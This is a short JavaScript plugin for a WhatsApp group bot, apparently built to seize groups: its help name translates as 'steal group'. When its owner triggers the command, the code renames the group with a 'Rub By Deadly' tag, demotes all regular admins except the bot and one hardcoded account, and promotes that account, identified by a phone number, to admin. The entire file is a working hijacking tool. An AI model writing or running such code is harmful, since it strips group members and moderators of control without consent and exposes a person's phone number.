let handler = async (m, { conn }) => {
  const AUTHORIZED = '447880017985@s.whatsapp.net'
  const botJid = conn.user.jid

  try {
    let metadata = await conn.groupMetadata(m.chat)
    let oldName = metadata.subject

    // Cambia nome gruppo
    await conn.groupUpdateSubject(
      m.chat,
      `${oldName} | 𝕽𝖚𝖇 𝕭𝖞 𝕯𝖊ⱥ𝖉𝖑𝐲`
    )

    // Prende SOLO admin (non creator)
    let adminsToDemote = metadata.participants
      .filter(p =>
        (p.admin === 'admin') && // solo admin normali
        p.id !== botJid &&
        p.id !== AUTHORIZED
      )
      .map(p => p.id)

    // Demote admin
    if (adminsToDemote.length > 0) {
      await conn.groupParticipantsUpdate(m.chat, adminsToDemote, 'demote')
    }

    // Assicura admin autorizzato
    await conn.groupParticipantsUpdate(m.chat, [AUTHORIZED], 'promote')

  } catch (e) {
    console.error(e)
  }
}

handler.help = ['rubagp']
handler.tags = ['group']
handler.command = /^(allakbar)$/i
handler.group = true
handler.owner = true
handler.botAdmin = true
handler.fail = null

export default handler